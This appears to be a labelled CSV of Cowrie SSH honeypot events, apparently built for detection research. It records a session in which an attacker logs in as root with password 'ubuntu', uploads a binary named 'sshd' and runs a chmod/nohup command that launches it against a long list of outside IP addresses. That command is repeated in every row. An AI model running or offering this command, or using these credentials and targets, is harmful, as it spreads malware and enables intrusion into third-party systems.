,event,session_id,session,labels
0,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:46516 (10.42.4.33:2222) [session: fcfef7904937]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 46516.0, ""timestamp"": ""2025-08-10T22:21:57.893589Z""}",fcfef7904937,chmod +x ./.5577515578064049276/sshd;nohup ./.5577515578064049276/sshd 124.225.67.32 39.106.57.208 8.245.24.52 180.163.61.238 62.171.162.142 5.178.111.210 82.180.154.188 85.174.227.19 188.235.158.122 116.128.243.59 47.109.28.100 192.241.228.126 176.126.84.72 222.187.215.194 15.204.224.32 36.163.199.18 36.151.192.243 45.131.111.106 147.93.62.20 185.103.103.83 211.101.244.162 120.48.32.185 212.115.54.22 46.235.84.183 125.124.106.113 120.233.147.34 158.51.96.38 111.170.168.6 139.214.222.149 43.167.236.203 221.14.147.153 152.110.82.109 34.122.156.88 139.59.253.66 96.78.175.36 62.171.184.111 157.255.155.179 145.223.117.124 43.139.160.130 103.232.21.226 117.173.76.160 39.164.232.214 103.145.145.78 106.75.68.22 117.149.247.143 178.128.253.94 114.231.77.98 163.172.34.113 45.15.168.245 111.12.131.236 154.124.241.135 &;,"['Execution', 'Initial Access']"
1,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:21:57.894158Z"", ""version"": ""SSH-2.0-Go""}",fcfef7904937,chmod +x ./.5577515578064049276/sshd;nohup ./.5577515578064049276/sshd 124.225.67.32 39.106.57.208 8.245.24.52 180.163.61.238 62.171.162.142 5.178.111.210 82.180.154.188 85.174.227.19 188.235.158.122 116.128.243.59 47.109.28.100 192.241.228.126 176.126.84.72 222.187.215.194 15.204.224.32 36.163.199.18 36.151.192.243 45.131.111.106 147.93.62.20 185.103.103.83 211.101.244.162 120.48.32.185 212.115.54.22 46.235.84.183 125.124.106.113 120.233.147.34 158.51.96.38 111.170.168.6 139.214.222.149 43.167.236.203 221.14.147.153 152.110.82.109 34.122.156.88 139.59.253.66 96.78.175.36 62.171.184.111 157.255.155.179 145.223.117.124 43.139.160.130 103.232.21.226 117.173.76.160 39.164.232.214 103.145.145.78 106.75.68.22 117.149.247.143 178.128.253.94 114.231.77.98 163.172.34.113 45.15.168.245 111.12.131.236 154.124.241.135 &;,"['Execution', 'Initial Access']"
2,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""98ddc5604ef6a1006a2b49a58759fbe6"", ""hashAlgorithms"": ""curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha1""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:21:57.979625Z""}",fcfef7904937,chmod +x ./.5577515578064049276/sshd;nohup ./.5577515578064049276/sshd 124.225.67.32 39.106.57.208 8.245.24.52 180.163.61.238 62.171.162.142 5.178.111.210 82.180.154.188 85.174.227.19 188.235.158.122 116.128.243.59 47.109.28.100 192.241.228.126 176.126.84.72 222.187.215.194 15.204.224.32 36.163.199.18 36.151.192.243 45.131.111.106 147.93.62.20 185.103.103.83 211.101.244.162 120.48.32.185 212.115.54.22 46.235.84.183 125.124.106.113 120.233.147.34 158.51.96.38 111.170.168.6 139.214.222.149 43.167.236.203 221.14.147.153 152.110.82.109 34.122.156.88 139.59.253.66 96.78.175.36 62.171.184.111 157.255.155.179 145.223.117.124 43.139.160.130 103.232.21.226 117.173.76.160 39.164.232.214 103.145.145.78 106.75.68.22 117.149.247.143 178.128.253.94 114.231.77.98 163.172.34.113 45.15.168.245 111.12.131.236 154.124.241.135 &;,"['Execution', 'Initial Access']"
3,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/ubuntu] succeeded"", ""password"": ""ubuntu"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:21:58.244271Z"", ""username"": ""root""}",fcfef7904937,chmod +x ./.5577515578064049276/sshd;nohup ./.5577515578064049276/sshd 124.225.67.32 39.106.57.208 8.245.24.52 180.163.61.238 62.171.162.142 5.178.111.210 82.180.154.188 85.174.227.19 188.235.158.122 116.128.243.59 47.109.28.100 192.241.228.126 176.126.84.72 222.187.215.194 15.204.224.32 36.163.199.18 36.151.192.243 45.131.111.106 147.93.62.20 185.103.103.83 211.101.244.162 120.48.32.185 212.115.54.22 46.235.84.183 125.124.106.113 120.233.147.34 158.51.96.38 111.170.168.6 139.214.222.149 43.167.236.203 221.14.147.153 152.110.82.109 34.122.156.88 139.59.253.66 96.78.175.36 62.171.184.111 157.255.155.179 145.223.117.124 43.139.160.130 103.232.21.226 117.173.76.160 39.164.232.214 103.145.145.78 106.75.68.22 117.149.247.143 178.128.253.94 114.231.77.98 163.172.34.113 45.15.168.245 111.12.131.236 154.124.241.135 &;,"['Execution', 'Initial Access']"
4,"{""eventid"": ""cowrie.session.file_upload"", ""filename"": ""sshd"", ""message"": ""SFTP Uploaded file \""sshd\"" to var/lib/cowrie/downloads/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00"", ""outfile"": ""var/lib/cowrie/downloads/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:23:26.278996Z""}",fcfef7904937,chmod +x ./.5577515578064049276/sshd;nohup ./.5577515578064049276/sshd 124.225.67.32 39.106.57.208 8.245.24.52 180.163.61.238 62.171.162.142 5.178.111.210 82.180.154.188 85.174.227.19 188.235.158.122 116.128.243.59 47.109.28.100 192.241.228.126 176.126.84.72 222.187.215.194 15.204.224.32 36.163.199.18 36.151.192.243 45.131.111.106 147.93.62.20 185.103.103.83 211.101.244.162 120.48.32.185 212.115.54.22 46.235.84.183 125.124.106.113 120.233.147.34 158.51.96.38 111.170.168.6 139.214.222.149 43.167.236.203 221.14.147.153 152.110.82.109 34.122.156.88 139.59.253.66 96.78.175.36 62.171.184.111 157.255.155.179 145.223.117.124 43.139.160.130 103.232.21.226 117.173.76.160 39.164.232.214 103.145.145.78 106.75.68.22 117.149.247.143 178.128.253.94 114.231.77.98 163.172.34.113 45.15.168.245 111.12.131.236 154.124.241.135 &;,"['Execution', 'Initial Access']"
5,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:23:26.626913Z""}",fcfef7904937,chmod +x ./.5577515578064049276/sshd;nohup ./.5577515578064049276/sshd 124.225.67.32 39.106.57.208 8.245.24.52 180.163.61.238 62.171.162.142 5.178.111.210 82.180.154.188 85.174.227.19 188.235.158.122 116.128.243.59 47.109.28.100 192.241.228.126 176.126.84.72 222.187.215.194 15.204.224.32 36.163.199.18 36.151.192.243 45.131.111.106 147.93.62.20 185.103.103.83 211.101.244.162 120.48.32.185 212.115.54.22 46.235.84.183 125.124.106.113 120.233.147.34 158.51.96.38 111.170.168.6 139.214.222.149 43.167.236.203 221.14.147.153 152.110.82.109 34.122.156.88 139.59.253.66 96.78.175.36 62.171.184.111 157.255.155.179 145.223.117.124 43.139.160.130 103.232.21.226 117.173.76.160 39.164.232.214 103.145.145.78 106.75.68.22 117.149.247.143 178.128.253.94 114.231.77.98 163.172.34.113 45.15.168.245 111.12.131.236 154.124.241.135 &;,"['Execution', 'Initial Access']"
6,"{""eventid"": ""cowrie.command.input"", ""input"": ""chmod +x ./.5577515578064049276/sshd;nohup ./.5577515578064049276/sshd 124.225.67.32 39.106.57.208 8.245.24.52 180.163.61.238 62.171.162.142 5.178.111.210 82.180.154.188 85.174.227.19 188.235.158.122 116.128.243.59 47.109.28.100 192.241.228.126 176.126.84.72 222.187.215.194 15.204.224.32 36.163.199.18 36.151.192.243 45.131.111.106 147.93.62.20 185.103.103.83 211.101.244.162 120.48.32.185 212.115.54.22 46.235.84.183 125.124.106.113 120.233.147.34 158.51.96.38 111.170.168.6 139.214.222.149 43.167.236.203 221.14.147.153 152.110.82.109 34.122.156.88 139.59.253.66 96.78.175.36 62.171.184.111 157.255.155.179 145.223.117.124 43.139.160.130 103.232.21.226 117.173.76.160 39.164.232.214 103.145.145.78 106.75.68.22 117.149.247.143 178.128.253.94 114.231.77.98 163.172.34.113 45.15.168.245 111.12.131.236 154.124.241.135 &"", ""message"": ""CMD: chmod +x ./.5577515578064049276/sshd;nohup ./.5577515578064049276/sshd 124.225.67.32 39.106.57.208 8.245.24.52 180.163.61.238 62.171.162.142 5.178.111.210 82.180.154.188 85.174.227.19 188.235.158.122 116.128.243.59 47.109.28.100 192.241.228.126 176.126.84.72 222.187.215.194 15.204.224.32 36.163.199.18 36.151.192.243 45.131.111.106 147.93.62.20 185.103.103.83 211.101.244.162 120.48.32.185 212.115.54.22 46.235.84.183 125.124.106.113 120.233.147.34 158.51.96.38 111.170.168.6 139.214.222.149 43.167.236.203 221.14.147.153 152.110.82.109 34.122.156.88 139.59.253.66 96.78.175.36 62.171.184.111 157.255.155.179 145.223.117.124 43.139.160.130 103.232.21.226 117.173.76.160 39.164.232.214 103.145.145.78 106.75.68.22 117.149.247.143 178.128.253.94 114.231.77.98 163.172.34.113 45.15.168.245 111.12.131.236 154.124.241.135 &"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:23:26.627275Z""}",fcfef7904937,chmod +x ./.5577515578064049276/sshd;nohup ./.5577515578064049276/sshd 124.225.67.32 39.106.57.208 8.245.24.52 180.163.61.238 62.171.162.142 5.178.111.210 82.180.154.188 85.174.227.19 188.235.158.122 116.128.243.59 47.109.28.100 192.241.228.126 176.126.84.72 222.187.215.194 15.204.224.32 36.163.199.18 36.151.192.243 45.131.111.106 147.93.62.20 185.103.103.83 211.101.244.162 120.48.32.185 212.115.54.22 46.235.84.183 125.124.106.113 120.233.147.34 158.51.96.38 111.170.168.6 139.214.222.149 43.167.236.203 221.14.147.153 152.110.82.109 34.122.156.88 139.59.253.66 96.78.175.36 62.171.184.111 157.255.155.179 145.223.117.124 43.139.160.130 103.232.21.226 117.173.76.160 39.164.232.214 103.145.145.78 106.75.68.22 117.149.247.143 178.128.253.94 114.231.77.98 163.172.34.113 45.15.168.245 111.12.131.236 154.124.241.135 &;,"['Execution', 'Initial Access']"
7,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/0fb58a44ee8287bb57f0929489413d4c1608fe57461b8b12f5728858607db0f6 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""0fb58a44ee8287bb57f0929489413d4c1608fe57461b8b12f5728858607db0f6"", ""size"": 136.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:23:26.714168Z"", ""ttylog"": ""var/lib/cowrie/tty/0fb58a44ee8287bb57f0929489413d4c1608fe57461b8b12f5728858607db0f6""}",fcfef7904937,chmod +x ./.5577515578064049276/sshd;nohup ./.5577515578064049276/sshd 124.225.67.32 39.106.57.208 8.245.24.52 180.163.61.238 62.171.162.142 5.178.111.210 82.180.154.188 85.174.227.19 188.235.158.122 116.128.243.59 47.109.28.100 192.241.228.126 176.126.84.72 222.187.215.194 15.204.224.32 36.163.199.18 36.151.192.243 45.131.111.106 147.93.62.20 185.103.103.83 211.101.244.162 120.48.32.185 212.115.54.22 46.235.84.183 125.124.106.113 120.233.147.34 158.51.96.38 111.170.168.6 139.214.222.149 43.167.236.203 221.14.147.153 152.110.82.109 34.122.156.88 139.59.253.66 96.78.175.36 62.171.184.111 157.255.155.179 145.223.117.124 43.139.160.130 103.232.21.226 117.173.76.160 39.164.232.214 103.145.145.78 106.75.68.22 117.149.247.143 178.128.253.94 114.231.77.98 163.172.34.113 45.15.168.245 111.12.131.236 154.124.241.135 &;,"['Execution', 'Initial Access']"
8,"{""duration"": ""88.8"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 88.8 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:23:26.722445Z""}",fcfef7904937,chmod +x ./.5577515578064049276/sshd;nohup ./.5577515578064049276/sshd 124.225.67.32 39.106.57.208 8.245.24.52 180.163.61.238 62.171.162.142 5.178.111.210 82.180.154.188 85.174.227.19 188.235.158.122 116.128.243.59 47.109.28.100 192.241.228.126 176.126.84.72 222.187.215.194 15.204.224.32 36.163.199.18 36.151.192.243 45.131.111.106 147.93.62.20 185.103.103.83 211.101.244.162 120.48.32.185 212.115.54.22 46.235.84.183 125.124.106.113 120.233.147.34 158.51.96.38 111.170.168.6 139.214.222.149 43.167.236.203 221.14.147.153 152.110.82.109 34.122.156.88 139.59.253.66 96.78.175.36 62.171.184.111 157.255.155.179 145.223.117.124 43.139.160.130 103.232.21.226 117.173.76.160 39.164.232.214 103.145.145.78 106.75.68.22 117.149.247.143 178.128.253.94 114.231.77.98 163.172.34.113 45.15.168.245 111.12.131.236 154.124.241.135 &;,"['Execution', 'Initial Access']"
9,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:8906 (10.42.6.15:2222) [session: be1939f18ace]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 8906.0, ""timestamp"": ""2025-08-04T23:53:22.641240Z""}",be1939f18ace,chmod +x ./.3752457885653305675/sshd;nohup ./.3752457885653305675/sshd 42.121.57.140 209.126.104.67 145.223.117.124 121.41.95.224 188.93.237.19 163.172.204.26 178.128.253.94 195.62.48.193 45.10.175.89 217.79.189.145 148.72.168.29 223.75.204.39 195.154.203.16 222.136.44.196 8.137.144.169 103.104.169.53 220.181.172.244 8.217.13.52 188.43.199.85 185.105.116.131 103.145.145.82 222.187.215.194 34.122.156.88 124.225.67.32 112.4.175.171 103.123.5.235 157.245.144.151 116.128.243.59 222.170.171.205 113.7.221.72 171.244.22.39 14.103.158.69 58.22.105.66 192.227.223.224 185.177.239.207 199.15.79.168 154.92.131.139 212.113.112.49 115.231.181.61 103.102.216.138 147.93.62.20 159.203.108.2 111.12.131.236 45.135.57.192 137.184.190.227 223.87.223.132 103.174.130.143 94.154.172.136 47.94.87.144 59.80.21.231 61.169.146.123 &;,"['Execution', 'Initial Access']"
